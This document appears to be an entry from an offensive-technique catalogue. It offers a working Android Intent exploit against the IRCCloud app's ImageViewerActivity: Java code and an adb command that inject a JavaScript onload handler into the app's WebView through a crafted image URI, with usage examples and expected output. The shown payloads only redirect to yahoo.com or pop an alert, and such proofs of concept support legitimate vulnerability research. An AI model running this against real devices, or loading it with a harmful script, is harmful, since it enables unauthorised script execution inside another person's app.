---
id: cmd-launch-intent-xss-001
data: >-
  Intent intent = new Intent();
  intent.setClassName("com.irccloud.android","com.irccloud.android.activity.ImageViewerActivity");
  intent.setData(Uri.parse("https://shoppersocial.me/wp-content/uploads/2016/06/wow.jpg'
  onload='window.location.href=\"http://yahoo.com\"")); startActivity(intent);
tags:
  - xss
  - intent
type: command
output: null
executor: java
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:39.321Z'
verified: false
validated: true
submitted: true
---
# Launch Malicious Intent to ImageViewerActivity

## Command

```java
Intent intent = new Intent(); intent.setClassName("com.irccloud.android","com.irccloud.android.activity.ImageViewerActivity"); intent.setData(Uri.parse("https://shoppersocial.me/wp-content/uploads/2016/06/wow.jpg' onload='window.location.href=\"http://yahoo.com\"")); startActivity(intent);
```

## Description

This Java command creates and launches an Android Intent targeting the IRCCloud ImageViewerActivity with a malicious data URI that injects JavaScript into the WebView's HTML, exploiting XSS for arbitrary execution like redirects.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| setClassName | Specifies package and activity class for targeting | Yes |
| setData | Parses and sets the malicious URI for injection | Yes |
| startActivity | Launches the intent to trigger the activity | Yes |

## Examples

### Basic Usage

```java
Intent intent = new Intent(); intent.setClassName("com.irccloud.android","com.irccloud.android.activity.ImageViewerActivity"); intent.setData(Uri.parse("malicious_url")); startActivity(intent);
```

### Advanced Usage

Embed in an Android test app or use ADB equivalent: adb shell am start -n com.irccloud.android/.activity.ImageViewerActivity -d "https://example.com/img.jpg' onload='alert(1)'"

## Expected Output

The ImageViewerActivity launches, loads the WebView with injected HTML, and executes the JS (e.g., redirects to http://yahoo.com), confirming XSS as visible in app behavior or logs.

## Related

- [[Related Procedure: Craft-and-Execute-Malicious-Intent-for-XSS]]
